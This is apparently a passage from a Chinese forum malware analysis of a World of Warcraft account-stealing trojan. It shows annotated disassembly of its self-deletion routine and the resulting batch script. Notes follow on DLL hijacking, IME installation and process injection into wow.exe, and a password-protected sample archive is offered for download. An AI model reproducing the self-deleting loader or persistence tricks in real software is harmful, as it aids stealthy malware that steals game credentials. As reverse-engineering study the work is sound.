00402A81 `|.` `FFD6` `call` `esi` `;  连接字符串%windir%\\system32\\font01.dll`
00402A83 `|.` `8D8424 340800>` `lea` `eax`, `dword ptr [esp+834]`
00402A8A `|.` `50` `push` `eax`
00402A8B `|.` `6A 6E` `push` `6E`
00402A8D `|.` `E8 6EE5FFFF` `call` `00401000` `;  创建文件%windir%\\system32\\font01.dll`

加载 `%windir%\\system32\\font01.dll`。

代码:



26.删除自身。

代码：



```
00401230   /$   81EC 580C0000 sub     esp, 0C58
00401236   |.   53             push    ebx
00401237   |.   8D8424 5C0400>lea     eax, dword ptr \[esp+45C\]
0040123E   |.   56             push    esi
0040123F   |.   50             push    eax                       ; /Buffer
00401240   |.   68 00040000    push    400                       ; |BufSize = 400 (1024.)
00401245   |.   C74424 10 000>mov     dword ptr \[esp+10\], 0        ; |
0040124D   |.   FF15 50304000 call    dword ptr \[<&KERNEL32.GetTempPat>; \检索系统临时目录路径
00401253   |.   8B35 4C304000 mov     esi, dword ptr \[<&KERNEL32.lstrc>;   kernel32.lstrcatA
00401259   |.   8D8C24 600400>lea     ecx, dword ptr \[esp+460\]
00401260   |.   68 38404000    push    00404038                    ; /StringToAdd = "wowhm01.bat"
00401265   |.   51             push    ecx                       ; |ConcatString
00401266   |.   FFD6          call    esi                       ; \连接字符串%temp%\wowhm01.bat
00401268   |.   8D9424 600400>lea     edx, dword ptr \[esp+460\]
0040126F   |.   52             push    edx                       ; /FileName
00401270   |.   FF15 48304000 call    dword ptr \[<&KERNEL32.DeleteFile>; \删除 wowhm01.bat
00401276   |.   8B0D 90414000 mov     ecx, dword ptr \[404190\]
0040127C   |.   8D8424 600800>lea     eax, dword ptr \[esp+860\]
00401283   |.   68 00040000    push    400                       ; /BufSize = 400 (1024.)
00401288   |.   50             push    eax                       ; |PathBuffer
00401289   |.   51             push    ecx                       ; |hModule => NULL
0040128A   |.   FF15 2C304000 call    dword ptr \[<&KERNEL32.GetModuleF>; \检索自身所在路径
00401290   |.   6A 00         push    0                         ; /hTemplateFile = NULL
00401292   |.   6A 00         push    0                         ; |Attributes = 0
00401294   |.   6A 02         push    2                         ; |Mode = CREATE_ALWAYS
00401296   |.   6A 00         push    0                         ; |pSecurity = NULL
00401298   |.   6A 03         push    3                         ; |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
0040129A   |.   8D9424 740400>lea     edx, dword ptr \[esp+474\]        ; |
004012A1   |.   68 000000C0    push    C0000000                    ; |Access = GENERIC_READ|GENERIC_WRITE
004012A6   |.   52             push    edx                       ; |FileName
004012A7   |.   FF15 08304000 call    dword ptr \[<&KERNEL32.CreateFile>; \创建%temp%\wowhm01.bat
004012AD   |.   8BD8          mov     ebx, eax
004012AF   |.   C74424 08 000>mov     dword ptr \[esp+8\], 400
004012B7   |.   83FB FF       cmp     ebx, -1
004012BA   |.   0F84 1F010000 je      004013DF
004012C0   |.   57             push    edi
004012C1   |.   B9 00010000    mov     ecx, 100
004012C6   |.   33C0          xor     eax, eax
004012C8   |.   8D7C24 64     lea     edi, dword ptr \[esp+64\]
004012CC   |.   F3:AB        rep     stos dword ptr es:\[edi\]
004012CE   |.   8D4424 64     lea     eax, dword ptr \[esp+64\]
004012D2   |.   68 30404000    push    00404030                    ; /String2 = ":try",CR,LF,""
004012D7   |.   50             push    eax                       ; |String1
004012D8   |.   FF15 44304000 call    dword ptr \[<&KERNEL32.lstrcpyA>\] ; \复制":try",CR,LF 到缓冲区
004012DE   |.   8D4C24 64     lea     ecx, dword ptr \[esp+64\]
004012E2   |.   68 28404000    push    00404028                    ; /StringToAdd = "del ""
004012E7   |.   51             push    ecx                       ; |ConcatString
004012E8   |.   FFD6          call    esi                       ; \连接字符":try",CR,LF,"del ""
004012EA   |.   8D9424 640800>lea     edx, dword ptr \[esp+864\]
004012F1   |.   8D4424 64     lea     eax, dword ptr \[esp+64\]
004012F5   |.   52             push    edx                       ; /StringToAdd
004012F6   |.   50             push    eax                       ; |ConcatString
004012F7   |.   FFD6          call    esi                       ; \将自身所在路径附在后面
004012F9   |.   8D4C24 64     lea     ecx, dword ptr \[esp+64\]
004012FD   |.   68 24404000    push    00404024                    ; /StringToAdd = """",CR,LF,""
00401302   |.   51             push    ecx                       ; |ConcatString
00401303   |.   FFD6          call    esi                       ; \加上""",CR,LF,""
00401305   |.   8D5424 64     lea     edx, dword ptr \[esp+64\]
00401309   |.   68 18404000    push    00404018                    ; /StringToAdd = "if exist ""
0040130E   |.   52             push    edx                       ; |ConcatString
0040130F   |.   FFD6          call    esi                       ; \同理
00401311   |.   8D8424 640800>lea     eax, dword ptr \[esp+864\]
00401318   |.   8D4C24 64     lea     ecx, dword ptr \[esp+64\]
0040131C   |.   50             push    eax                       ; /StringToAdd
0040131D   |.   51             push    ecx                       ; |ConcatString
0040131E   |.   FFD6          call    esi                       ; \lstrcatA
00401320   |.   8D5424 64     lea     edx, dword ptr \[esp+64\]
00401324   |.   68 14404000    push    00404014                    ; /StringToAdd = " """
00401329   |.   52             push    edx                       ; |ConcatString
0040132A   |.   FFD6          call    esi                       ; \lstrcatA
0040132C   |.   8D4424 64     lea     eax, dword ptr \[esp+64\]
00401330   |.   68 08404000    push    00404008                    ; /StringToAdd = "goto try ",CR,LF,""
00401335   |.   50             push    eax                       ; |ConcatString
00401336   |.   FFD6          call    esi                       ; \lstrcatA
00401338   |.   8D4C24 64     lea     ecx, dword ptr \[esp+64\]
0040133C   |.   68 28404000    push    00404028                    ; /StringToAdd = "del ""
00401341   |.   51             push    ecx                       ; |ConcatString
00401342   |.   FFD6          call    esi                       ; \lstrcatA
00401344   |.   8D9424 640400>lea     edx, dword ptr \[esp+464\]
0040134B   |.   8D4424 64     lea     eax, dword ptr \[esp+64\]
0040134F   |.   52             push    edx                       ; /StringToAdd
00401350   |.   50             push    eax                       ; |ConcatString
00401351   |.   FFD6          call    esi                       ; \lstrcatA
00401353   |.   8D4C24 64     lea     ecx, dword ptr \[esp+64\]
00401357   |.   68 24404000    push    00404024                    ; /StringToAdd = """",CR,LF,""
0040135C   |.   51             push    ecx                       ; |ConcatString
0040135D   |.   FFD6          call    esi                       ; \lstrcatA
0040135F   |.   8D5424 64     lea     edx, dword ptr \[esp+64\]
00401363   |.   68 04404000    push    00404004                    ; /StringToAdd = "cls"
00401368   |.   52             push    edx                       ; |ConcatString
00401369   |.   FFD6          call    esi                       ; \lstrcatA
0040136B   |.   8D4424 0C     lea     eax, dword ptr \[esp+C\]
0040136F   |.   6A 00         push    0                         ; /pOverlapped = NULL
00401371   |.   50             push    eax                       ; |pBytesWritten
00401372   |.   8D4C24 6C     lea     ecx, dword ptr \[esp+6C\]          ; |
00401376   |.   68 00040000    push    400                       ; |nBytesToWrite = 400 (1024.)
0040137B   |.   51             push    ecx                       ; |Buffer
0040137C   |.   53             push    ebx                       ; |hFile
0040137D   |.   FF15 04304000 call    dword ptr \[<&KERNEL32.WriteFile>>; \将以上数据写入
00401383   |.   8B35 00304000 mov     esi, dword ptr \[<&KERNEL32.Close>;   kernel32.CloseHandle
00401389   |.   53             push    ebx                       ; /hObject
0040138A   |.   FFD6          call    esi                       ; \CloseHandle
0040138C   |.   B9 11000000    mov     ecx, 11
00401391   |.   33C0          xor     eax, eax
00401393   |.   8D7C24 20     lea     edi, dword ptr \[esp+20\]
00401397   |.   8D5424 10     lea     edx, dword ptr \[esp+10\]
0040139B   |.   F3:AB        rep     stos dword ptr es:\[edi\]
0040139D   |.   66:894424 50  mov     word ptr \[esp+50\], ax
004013A2   |.   8D4424 20     lea     eax, dword ptr \[esp+20\]
004013A6   |.   52             push    edx                       ; /pProcessInfo
004013A7   |.   50             push    eax                       ; |pStartupInfo
004013A8   |.   6A 00         push    0                         ; |CurrentDir = NULL
004013AA   |.   6A 00         push    0                         ; |pEnvironment = NULL
004013AC   |.   6A 40         push    40                        ; |CreationFlags = IDLE_PRIORITY_CLASS
004013AE   |.   C74424 60 010>mov     dword ptr \[esp+60\], 1          ; |
004013B6   |.   6A 00         push    0                         ; |InheritHandles = FALSE
004013B8   |.   6A 00         push    0                         ; |pThreadSecurity = NULL
004013BA   |.   8D8C24 800400>lea     ecx, dword ptr \[esp+480\]          ; |
004013C1   |.   6A 00         push    0                         ; |pProcessSecurity = NULL
004013C3   |.   51             push    ecx                       ; |CommandLine
004013C4   |.   6A 00         push    0                         ; |ModuleFileName = NULL
004013C6   |.   FF15 40304000 call    dword ptr \[<&KERNEL32.CreateProc>; \运行%temp%\wowhm01.bat,删除自身
004013CC   |.   85C0          test    eax, eax
004013CE   |.   5F             pop     edi
004013CF   |.   74 0E         je      short 004013DF
004013D1   |.   8B5424 10     mov     edx, dword ptr \[esp+10\]
004013D5   |.   52             push    edx                       ; /hObject
004013D6   |.   FFD6          call    esi                       ; \CloseHandle
004013D8   |.   8B4424 0C     mov     eax, dword ptr \[esp+C\]
004013DC   |.   50             push    eax                       ; /hObject
004013DD   |.   FFD6          call    esi                       ; \CloseHandle
004013DF   |>   5E             pop     esi
004013E0   |.   5B             pop     ebx
004013E1   |.   81C4 580C0000 add     esp, 0C58
004013E7   \.   C3             retn

```



代码：

```
:try
del "C:\Documents and Settings\Administrator\桌面\temp\新建文件夹\virus.exe"
if exist "C:\Documents and Settings\Administrator\桌面\temp\新建文件夹\virus.exe" goto try 
del "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\wowhm01.bat"
cls
```

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) | `wow.rar`(解压密码是：`muma`) |
|---|---|

我再来补充一点吧：

`res:108` 号 `PDLL.DLL`

检查当前进程是否为 `wow.exe`，如果是，则手工载入 `106` 号资源 `WinWcolw.ocx` 并执行

`res:110` 号 `ime1.dll`

避开 `DragonNest.exe`，`Dnlauncher.exe`，`imeutil.exe`

注册一个名为`DLLISUI`的窗口类，但回调函数为空函数。

线程函数 1 号：

检查是否有 `1000.ocx` 到 `1040.ocx`，如果有，就是用 `LoadLibrary` 载入。

线程函数 2 号：

生成`%system%\Winnt.com`。`GetTickCOunt()`用于备份当前的 `winnt.com`

检查 `dsound.dll` 是否存在

`"C:\WINDOWS\system32\..\system\dsound.dll"`

`"C:\WINDOWS\system32\..\dsound.dll"`

同样的还有 `ddraw.dll`，`comres.dll`，`ksuser.dll`，`olepro32.dll`

将自己作为一个英语(美国)`IME`安装

然后 `WinWcolw.ocx` 由于加了 `VMP`，没技术去还原，但是看看 `data` 区里面的字符串，我突然觉得我还原了干嘛呢，除了那个 `url`。可是如果真的想看的话，找台 `VM` 中个毒，然后开启网络拦截就知道了么，那个网址解不解码其实不是什么问题。当然了，我直接双击运行之后，发现裸奔 `Winxp` 的 `VM` 依然未中毒，顿时感觉很无奈……
